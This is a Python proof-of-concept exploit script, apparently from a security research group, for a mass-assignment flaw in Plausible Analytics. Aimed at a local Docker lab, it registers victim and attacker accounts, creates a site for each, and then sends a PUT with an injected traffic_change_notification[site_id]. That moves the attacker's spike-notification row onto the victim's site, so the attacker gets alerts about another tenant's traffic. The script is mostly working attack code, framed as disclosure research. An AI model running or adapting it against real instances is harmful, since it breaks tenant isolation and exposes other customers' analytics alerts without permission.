#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: plausible-traffic-notify (High: 7.1)
#  Vendor: Plausible Analytics (Plausible Insights OÜ)
#  Versions: Plausible Analytics master d44e104ae3943a (CE + EE lib/)
#  Impact: Owner/admin/editor PUT traffic-change-notification site_id re-parents spike/drop row onto victim site
#  Requires: Docker, loopback 127.0.0.1:18183, pin image plausible-lab:d44e104ae3943a or clone github.com/plausible/analytics at d44e104
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "plausible-traffic-notify"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only lab: traffic-change notification site_id mass-assignment."""

import base64
import html as html_lib
import http.cookiejar
import json
import os
import re
import socket
import struct
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from http.client import HTTPMessage
from pathlib import Path
from typing import Any

LABEL = "plausible-traffic-notify"
WITNESS = "PLAUSIBLE-H03-TRAFFIC-NOTIFY-SITEID-WITNESS"
HOST = "127.0.0.1"
PORT = 18183
BASE = os.environ.get("PLAUSIBLE_URL", f"http://{HOST}:{PORT}").rstrip("/")
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "plausible-traffic-notify")
HERE = Path(__file__).resolve().parent
PG_SERVICE = "plausible_db"
PG_DB = "plausible_db"
PG_USER = "postgres"

VICTIM_EMAIL = "victim@lab.invalid"
VICTIM_NAME = "Victim Owner"
VICTIM_DOMAIN = "victim.lab"
ATTACKER_EMAIL = "attacker@lab.invalid"
ATTACKER_NAME = "Attacker Owner"
ATTACKER_DOMAIN = "attacker.lab"
# Longer than 32 bytes skips zxcvbn (Auth.User.password_strength).
VICTIM_PASSWORD = "victim-lab-traffic-notify-pass-0001"
ATTACKER_PASSWORD = "attacker-lab-traffic-notify-pass-0001"

ORIGIN = BASE
WS_TIMEOUT_S = 30.0
HTTP_TIMEOUT_S = 30


@dataclass(frozen=True)
class HttpResponse:
    status: int
    url: str
    headers: HTTPMessage
    body: bytes

    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def success() -> int:
    log(f"SUCCESS {LABEL} {WITNESS}")
    return 0


def sanitize(text: str) -> str:
    return text.replace("\n", " ").replace("\r", " ")[:240]


def _attr(tag: str, name: str) -> str | None:
    escaped = re.escape(name)
    match = re.search(rf"""{escaped}\s*=\s*["']([^"']*)["']""", tag, re.I)
    if match is None:
        return None
    return html_lib.unescape(match.group(1))


def extract_csrf(page: str) -> str | None:
    patterns = (
        r'name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']',
        r'content=["\']([^"\']+)["\']\s+name=["\']csrf-token["\']',
        r'name=["\']_csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'][^>]*name=["\']_csrf_token["\']',
    )
    for pattern in patterns:
        match = re.search(pattern, page, re.I | re.S)
        if match is not None:
            return html_lib.unescape(match.group(1))
    return None


def extract_liveview(page: str) -> tuple[str, str, str]:
    for match in re.finditer(r"<[^>]+>", page, re.S):
        tag = match.group(0)
        if "data-phx-session" not in tag:
            continue
        if "data-phx-main" not in tag:
            continue
        lv_id = _attr(tag, "id")
        session = _attr(tag, "data-phx-session")
        static = _attr(tag, "data-phx-static") or ""
        if lv_id and session is not None:
            return lv_id, session, static
    raise RuntimeError("liveview-root-missing")


class Client:
    def __init__(self) -> None:
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )

    def cookie_header(self) -> str:
        parts = [f"{cookie.name}={cookie.value}" for cookie in self.jar]
        return "; ".join(parts)

    def request(
        self,
        method: str,
        path: str,
        form: dict[str, str] | None = None,
        json_body: dict[str, Any] | None = None,
        timeout: int = HTTP_TIMEOUT_S,
        follow: bool = True,
    ) -> HttpResponse:
        url = path if path.startswith("http") else f"{BASE}{path}"
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
            "Origin": ORIGIN,
            "Referer": url if method == "GET" else BASE + "/",
        }
        data: bytes | None = None
        if form is not None:
            data = urllib.parse.urlencode(form).encode("utf-8")
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        elif json_body is not None:
            data = json.dumps(json_body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            if follow:
                with self.opener.open(req, timeout=timeout) as resp:
                    body = resp.read()
                    return HttpResponse(int(resp.status), resp.geturl(), resp.headers, body)
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(self.jar),
                _NoRedirect(),
            )
            with opener.open(req, timeout=timeout) as resp:
                body = resp.read()
                return HttpResponse(int(resp.status), resp.geturl(), resp.headers, body)
        except urllib.error.HTTPError as exc:
            body = exc.read() if exc.fp is not None else b""
            headers_map = exc.headers if exc.headers is not None else HTTPMessage()
            return HttpResponse(int(exc.code), url, headers_map, body)
        except Exception as exc:
            return HttpResponse(0, url, HTTPMessage(), sanitize(str(exc)).encode("utf-8"))


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(
        self,
        req: urllib.request.Request,
        fp: Any,
        code: int,
        msg: str,
        headers: HTTPMessage,
        newurl: str,
    ) -> urllib.request.Request | None:
        return None


class WebSocket:
    def __init__(self, sock: socket.socket) -> None:
        self.sock = sock
        self.buf = bytearray()

    def close(self) -> None:
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        self.sock.close()

    def send_text(self, text: str) -> None:
        payload = text.encode("utf-8")
        header = bytearray([0x81])
        n = len(payload)
        mask_bit = 0x80
        if n < 126:
            header.append(mask_bit | n)
        elif n < 65536:
            header.append(mask_bit | 126)
            header.extend(struct.pack("!H", n))
        else:
            header.append(mask_bit | 127)
            header.extend(struct.pack("!Q", n))
        mask = os.urandom(4)
        header.extend(mask)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        self.sock.sendall(header + masked)

    def recv_text(self, deadline: float) -> str:
        while True:
            opcode, payload = self._recv_frame(deadline)
            if opcode == 0x1:
                return payload.decode("utf-8")
            if opcode == 0x8:
                raise RuntimeError("websocket-closed")
            if opcode == 0x9:
                self._send_pong(payload)
                continue
            if opcode == 0xA:
                continue
            if opcode == 0x2:
                raise RuntimeError("websocket-binary")
            raise RuntimeError(f"websocket-opcode-{opcode}")

    def _send_pong(self, payload: bytes) -> None:
        header = bytearray([0x8A])
        n = len(payload)
        mask_bit = 0x80
        if n < 126:
            header.append(mask_bit | n)
        else:
            header.append(mask_bit | 126)
            header.extend(struct.pack("!H", n))
        mask = os.urandom(4)
        header.extend(mask)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        self.sock.sendall(header + masked)

    def _recv_exact(self, n: int, deadline: float) -> bytes:
        while len(self.buf) < n:
            remain = deadline - time.time()
            if remain <= 0:
                raise TimeoutError("websocket-timeout")
            self.sock.settimeout(remain)
            chunk = self.sock.recv(16384)
            if not chunk:
                raise RuntimeError("websocket-eof")
            self.buf.extend(chunk)
        out = bytes(self.buf[:n])
        del self.buf[:n]
        return out

    def _recv_frame(self, deadline: float) -> tuple[int, bytes]:
        hdr = self._recv_exact(2, deadline)
        b1, b2 = hdr[0], hdr[1]
        opcode = b1 & 0x0F
        masked = bool(b2 & 0x80)
        length = b2 & 0x7F
        if length == 126:
            length = struct.unpack("!H", self._recv_exact(2, deadline))[0]
        elif length == 127:
            length = struct.unpack("!Q", self._recv_exact(8, deadline))[0]
        mask = self._recv_exact(4, deadline) if masked else b""
        payload = self._recv_exact(length, deadline)
        if masked:
            payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        if not (b1 & 0x80):
            raise RuntimeError("websocket-fragment")
        return opcode, payload


def ws_connect(client: Client, path: str, extra_query: dict[str, str]) -> WebSocket:
    parsed = urllib.parse.urlparse(BASE)
    host = parsed.hostname or HOST
    port = parsed.port or PORT
    query = urllib.parse.urlencode(extra_query)
    target = f"{path}?{query}"
    key = os.urandom(16)
    ws_key = base64.b64encode(key).decode("ascii")
    headers = [
        f"GET {target} HTTP/1.1",
        f"Host: {host}:{port}",
        "Upgrade: websocket",
        "Connection: Upgrade",
        f"Sec-WebSocket-Key: {ws_key}",
        "Sec-WebSocket-Version: 13",
        f"Origin: {ORIGIN}",
        "User-Agent: plausible-traffic-notify-lab",
    ]
    cookie = client.cookie_header()
    if cookie:
        headers.append(f"Cookie: {cookie}")
    blob = ("\r\n".join(headers) + "\r\n\r\n").encode("utf-8")
    sock = socket.create_connection((host, port), timeout=HTTP_TIMEOUT_S)
    sock.sendall(blob)
    buf = bytearray()
    deadline = time.time() + WS_TIMEOUT_S
    while b"\r\n\r\n" not in buf:
        remain = deadline - time.time()
        if remain <= 0:
            sock.close()
            raise TimeoutError("websocket-upgrade-timeout")
        sock.settimeout(remain)
        chunk = sock.recv(16384)
        if not chunk:
            sock.close()
            raise RuntimeError("websocket-upgrade-eof")
        buf.extend(chunk)
    head, rest = buf.split(b"\r\n\r\n", 1)
    status_line = head.split(b"\r\n", 1)[0].decode("ascii", "replace")
    if " 101 " not in f" {status_line} " and not status_line.endswith(" 101"):
        sock.close()
        raise RuntimeError(f"websocket-upgrade-{sanitize(status_line)}")
    ws = WebSocket(sock)
    ws.buf.extend(rest)
    return ws


def phx_send(ws: WebSocket, join_ref: str, ref: str, topic: str, event: str, payload: Any) -> None:
    ws.send_text(json.dumps([join_ref, ref, topic, event, payload]))


def phx_recv_until(
    ws: WebSocket,
    topic: str,
    event: str,
    ref: str | None,
    deadline: float,
) -> list[Any]:
    while True:
        raw = ws.recv_text(deadline)
        try:
            msg = json.loads(raw)
        except json.JSONDecodeError as exc:
            raise RuntimeError(f"phx-json-{sanitize(raw)}") from exc
        if not isinstance(msg, list) or len(msg) < 5:
            continue
        _join_ref, msg_ref, msg_topic, msg_event, _payload = msg[:5]
        if msg_event == "phx_error":
            raise RuntimeError(f"phx-error-{sanitize(raw)}")
        if msg_topic == topic and msg_event == event:
            if ref is None or str(msg_ref) == str(ref):
                return msg
        if msg_event == "heartbeat":
            continue


def liveview_register(
    client: Client,
    *,
    name: str,
    email: str,
    password: str,
) -> HttpResponse:
    page = client.request("GET", "/register")
    if page.status != 200:
        raise RuntimeError(f"register-get-{page.status}")
    csrf = extract_csrf(page.text())
    if not csrf:
        raise RuntimeError("register-csrf-missing")
    lv_id, session, static = extract_liveview(page.text())
    ws = ws_connect(
        client,
        "/live/websocket",
        {"_csrf_token": csrf, "vsn": "2.0.0"},
    )
    try:
        topic = f"lv:{lv_id}"
        join_payload = {
            "url": f"{BASE}/register",
            "params": {
                "_csrf_token": csrf,
                "_mounts": 0,
                "_mount_attempts": 0,
            },
            "session": session,
            "static": static or None,
        }
        phx_send(ws, "1", "1", topic, "phx_join", join_payload)
        join_msg = phx_recv_until(ws, topic, "phx_reply", "1", time.time() + WS_TIMEOUT_S)
        join_body = join_msg[4] if len(join_msg) > 4 else {}
        if not isinstance(join_body, dict) or join_body.get("status") != "ok":
            raise RuntimeError(f"liveview-join-{sanitize(json.dumps(join_body)[:300])}")
        form = urllib.parse.urlencode(
            {
                "user[name]": name,
                "user[email]": email,
                "user[password]": password,
                "user[register_action]": "register_form",
                "_csrf_token": csrf,
            }
        )
        event_payload = {
            "type": "form",
            "event": "register",
            "value": form,
            "meta": {},
        }
        phx_send(ws, "1", "2", topic, "event", event_payload)
        reply = phx_recv_until(ws, topic, "phx_reply", "2", time.time() + WS_TIMEOUT_S)
        body = reply[4] if len(reply) > 4 else {}
        log(f"IOC liveview-register-email={email} reply={sanitize(json.dumps(body)[:400])}")
        if not isinstance(body, dict) or body.get("status") != "ok":
            raise RuntimeError(f"liveview-register-{sanitize(json.dumps(body)[:300])}")
    finally:
        ws.close()
    return page


def psql(sql: str) -> str:
    proc = subprocess.run(
        [
            "docker",
            "compose",
            "-p",
            COMPOSE,
            "exec",
            "-T",
            PG_SERVICE,
            "psql",
            "-U",
            PG_USER,
            "-d",
            PG_DB,
            "-A",
            "-F",
            "\t",
            "-t",
            "-c",
            sql,
        ],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    if proc.returncode != 0:
        err = sanitize((proc.stderr or proc.stdout or "").strip() or f"rc={proc.returncode}")
        raise RuntimeError(f"psql-failed-{err}")
    return proc.stdout


def psql_rows(sql: str) -> list[list[str]]:
    raw = psql(sql).strip()
    if not raw:
        return []
    return [line.split("\t") for line in raw.splitlines() if line.strip()]


def wait_user(email: str, attempts: int = 20) -> bool:
    for _ in range(attempts):
        rows = psql_rows(
            "SELECT id FROM users WHERE email = '{0}'".format(email.replace("'", "''"))
        )
        if rows:
            return True
        time.sleep(0.5)
    return False


def login(client: Client, email: str, password: str) -> int:
    page = client.request("GET", "/login")
    if page.status not in {200, 302}:
        return page.status
    csrf = extract_csrf(page.text())
    if not csrf:
        # First-launch /login 302 to /register; follow once.
        if page.status == 302 or "register" in page.url:
            page = client.request("GET", "/login", follow=True)
            csrf = extract_csrf(page.text())
    if not csrf:
        raise RuntimeError("login-csrf-missing")
    resp = client.request(
        "POST",
        "/login",
        form={"_csrf_token": csrf, "email": email, "password": password},
        follow=True,
    )
    return resp.status


def csrf_from(client: Client, path: str) -> str:
    page = client.request("GET", path)
    token = extract_csrf(page.text())
    if not token:
        raise RuntimeError(f"csrf-missing-{path}")
    return token


def create_site(client: Client, domain: str) -> int:
    token = csrf_from(client, "/sites/new")
    resp = client.request(
        "POST",
        "/sites",
        form={
            "_csrf_token": token,
            "site[domain]": domain,
            "site[timezone]": "Etc/UTC",
        },
        follow=True,
    )
    return resp.status


def site_row(domain: str) -> tuple[int, str, str]:
    rows = psql_rows(
        "SELECT id, domain, team_id FROM sites WHERE domain = '{0}'".format(
            domain.replace("'", "''")
        )
    )
    if not rows or len(rows[0]) < 3:
        raise RuntimeError(f"site-missing-{domain}")
    return int(rows[0][0]), rows[0][1], rows[0][2]


def spike_rows() -> list[list[str]]:
    return psql_rows(
        "SELECT id, site_id, type, threshold, recipients::text, last_sent "
        "FROM spike_notifications ORDER BY id"
    )


def attacker_on_victim() -> bool:
    rows = psql_rows(
        """
        SELECT 1
        FROM users u
        JOIN team_memberships tm ON tm.user_id = u.id
        JOIN sites s ON s.team_id = tm.team_id
        WHERE u.email = '{0}' AND s.domain = '{1}'
        UNION ALL
        SELECT 1
        FROM users u
        JOIN team_memberships tm ON tm.user_id = u.id
        JOIN guest_memberships gm ON gm.team_membership_id = tm.id
        JOIN sites s ON s.id = gm.site_id
        WHERE u.email = '{0}' AND s.domain = '{1}'
        """.format(
            ATTACKER_EMAIL.replace("'", "''"),
            VICTIM_DOMAIN.replace("'", "''"),
        )
    )
    return bool(rows)


def main() -> int:
    health = Client().request("GET", "/api/health")
    if health.status != 200:
        login_page = Client().request("GET", "/login")
        register_page = Client().request("GET", "/register")
        if register_page.status != 200 and login_page.status not in {200, 302}:
            return fail(f"app-not-ready-health-{health.status}")

    victim = Client()
    log("IOC register victim via LiveView /register")
    try:
        liveview_register(
            victim, name=VICTIM_NAME, email=VICTIM_EMAIL, password=VICTIM_PASSWORD
        )
    except Exception as exc:
        return fail(f"victim-register-{sanitize(str(exc))}")
    if not wait_user(VICTIM_EMAIL):
        return fail("victim-user-missing")

    victim = Client()
    status = login(victim, VICTIM_EMAIL, VICTIM_PASSWORD)
    log(f"IOC victim-login status={status}")
    if status not in {200, 302}:
        return fail(f"victim-login-{status}")
    status = create_site(victim, VICTIM_DOMAIN)
    log(f"IOC victim-create-site status={status}")
    try:
        victim_site_id, _, victim_team_id = site_row(VICTIM_DOMAIN)
    except Exception as exc:
        return fail(sanitize(str(exc)))
    log(f"IOC victim_site_id={victim_site_id} victim_team_id={victim_team_id}")

    attacker = Client()
    log("IOC register attacker via LiveView /register")
    try:
        liveview_register(
            attacker,
            name=ATTACKER_NAME,
            email=ATTACKER_EMAIL,
            password=ATTACKER_PASSWORD,
        )
    except Exception as exc:
        return fail(f"attacker-register-{sanitize(str(exc))}")
    if not wait_user(ATTACKER_EMAIL):
        return fail("attacker-user-missing")

    attacker = Client()
    status = login(attacker, ATTACKER_EMAIL, ATTACKER_PASSWORD)
    log(f"IOC attacker-login status={status}")
    if status not in {200, 302}:
        return fail(f"attacker-login-{status}")
    status = create_site(attacker, ATTACKER_DOMAIN)
    log(f"IOC attacker-create-site status={status}")
    try:
        attacker_site_id, _, attacker_team_id = site_row(ATTACKER_DOMAIN)
    except Exception as exc:
        return fail(sanitize(str(exc)))
    log(f"IOC attacker_site_id={attacker_site_id} attacker_team_id={attacker_team_id}")

    if attacker_team_id == victim_team_id:
        return fail("same-team-not-cross-tenant")
    if attacker_on_victim():
        return fail("attacker-member-of-victim")
    log("IOC attacker-not-member-of-victim=1")

    token = csrf_from(attacker, f"/{ATTACKER_DOMAIN}/settings/email-reports")
    enable = attacker.request(
        "POST",
        f"/sites/{ATTACKER_DOMAIN}/traffic-change-notification/spike/enable",
        form={"_csrf_token": token},
        follow=False,
    )
    log(f"IOC enable-spike status={enable.status}")
    if enable.status not in {200, 302}:
        return fail(f"enable-spike-{enable.status}")

    before = spike_rows()
    log(f"IOC spike-before={sanitize(repr(before))}")
    if len(before) != 1:
        return fail(f"spike-row-count-before-{len(before)}")
    row_id, site_id_s, ntype, _threshold, recipients, _last = (
        before[0] + [""] * 6
    )[:6]
    if int(site_id_s) != attacker_site_id:
        return fail(f"enable-site-id-{site_id_s}")
    if ntype != "spike":
        return fail(f"enable-type-{ntype}")
    if ATTACKER_EMAIL.lower() not in recipients.lower():
        return fail("enable-recipients-missing-attacker")

    token = csrf_from(attacker, f"/{ATTACKER_DOMAIN}/settings/email-reports")
    control = attacker.request(
        "PUT",
        f"/sites/{VICTIM_DOMAIN}/traffic-change-notification/spike",
        form={
            "_csrf_token": token,
            "traffic_change_notification[threshold]": "1",
        },
        follow=False,
    )
    log(f"IOC control_victim_path_status={control.status}")
    if control.status != 404:
        return fail(f"control-victim-path-{control.status}")

    token = csrf_from(attacker, f"/{ATTACKER_DOMAIN}/settings/email-reports")
    leftover = attacker.request(
        "PUT",
        f"/sites/{ATTACKER_DOMAIN}/traffic-change-notification/spike",
        form={
            "_csrf_token": token,
            "traffic_change_notification[threshold]": "1",
            "traffic_change_notification[site_id]": str(victim_site_id),
        },
        follow=False,
    )
    log(f"IOC leftover-put status={leftover.status} body={sanitize(leftover.text())}")
    if leftover.status not in {200, 302}:
        return fail(f"leftover-put-{leftover.status}")

    after = spike_rows()
    log(f"IOC spike-after={sanitize(repr(after))}")
    if len(after) != 1:
        return fail(f"spike-row-count-after-{len(after)}")
    row_id, site_id_s, ntype, _threshold, recipients, _last = (after[0] + [""] * 6)[:6]
    log(f"IOC spike_row_id={row_id}")
    log(f"IOC spike_site_id={site_id_s}")
    log(f"IOC recipients={recipients}")
    if int(site_id_s) != victim_site_id:
        return fail(f"reparent-site-id-{site_id_s}-want-{victim_site_id}")
    if ATTACKER_EMAIL.lower() not in recipients.lower():
        return fail("recipients-lost-attacker")
    if int(row_id) != int(before[0][0]):
        log(f"IOC row-id-changed before={before[0][0]} after={row_id}")

    return success()


if __name__ == "__main__":
    raise SystemExit(main())

